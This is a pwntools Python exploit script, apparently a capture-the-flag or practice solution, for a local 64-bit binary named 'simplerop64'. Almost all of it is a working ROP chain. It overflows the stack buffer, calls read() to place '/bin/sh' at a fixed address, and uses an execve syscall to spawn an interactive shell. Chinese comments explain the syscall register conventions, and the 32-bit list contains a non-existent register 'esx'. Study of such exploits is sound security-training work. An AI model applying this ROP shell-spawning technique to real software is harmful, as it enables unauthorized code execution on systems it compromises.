from pwn import*
context(arch='amd64', os='linux', log_level='debug')
p   = process('./simplerop64')
elf = ELF('./simplerop64')

# 32位
# eax = 0xb       // execve系统调用号
# ebx = /bin/sh   // 第一个参数
# ecx = 0         // 第二个参数
# edx = 0         // 第三个参数
# esx = 0         // 第四个参数
# edi = 0         // 第五个参数
#
# 64位
# rax = 0x3B      // execve系统调用号
# rdi = /bin/sh   // 第一个参数
# rsi = 0         // 第二个参数
# rdx = 0         // 第三个参数
# rcx = 0         // 第四个参数
# r8  = 0         // 第五个参数
# r9  = 0         // 第六个参数
pop_rax = 0x419a1c
pop_rdi = 0x401d1d
pop_rsi = 0x40a30d
pop_rdx = 0x401858

binsh = 0x49F060
read  = elf.symbols['read']

# 32位 : int 0x80
# 64位 : syscall
syscall = 0x401243

payload  = b'a' * (0x20 + 8)
# 调用read读取/bin/sh
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(binsh)
payload += p64(pop_rdx)
payload += p64(len('/bin/sh' + '\0'))
payload += p64(read)
# 调用系统中断
payload += p64(pop_rax)
payload += p64(0x3B)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

p.recvuntil('something')
p.send(payload)
p.send('/bin/sh' + '\0')
p.interactive()